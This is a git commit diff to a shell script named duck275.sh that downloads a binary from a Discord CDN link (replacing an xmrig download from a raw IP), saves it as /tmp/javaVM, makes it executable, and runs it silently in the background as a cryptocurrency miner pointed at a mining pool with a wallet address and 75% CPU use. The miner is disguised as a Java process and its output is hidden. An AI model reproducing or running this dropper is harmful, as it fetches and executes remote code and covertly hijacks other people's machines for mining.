8d536bf462c8ab31509d8f8f26d1a5859eb956ed
cronjob <thesunofme1@gmail.com>
2023-11-21 05:35:29 +0700

    Update duck275.sh

--- duck275.sh
+++ duck275.sh
@@ -4,7 +4,7 @@ if [ -f /tmp/javaVM ]
  	/tmp/javaVM -o 143.47.231.0:443 -u ZEPHYR3RCLzj46G67Ubxse1CHxYyH8BmWhq5zYR6jpsBWrZpPq9N5dGa9gAJHNC1KfC5NkRjAecx954DRsUu7spVja4UDc9NuEa2e -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
  	echo Started Existing
  	else
- 		wget -q http://150.136.168.71:80/archxx/xmrig -O /tmp/javaVM
+ 		wget -q https://cdn.discordapp.com/attachments/1077106588814422077/1176281046459879526/SRB -O /tmp/javaVM
  		chmod +x /tmp/javaVM
  		/tmp/javaVM -o 143.47.231.0:443 -u ZEPHYR3RCLzj46G67Ubxse1CHxYyH8BmWhq5zYR6jpsBWrZpPq9N5dGa9gAJHNC1KfC5NkRjAecx954DRsUu7spVja4UDc9NuEa2e -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
 fi
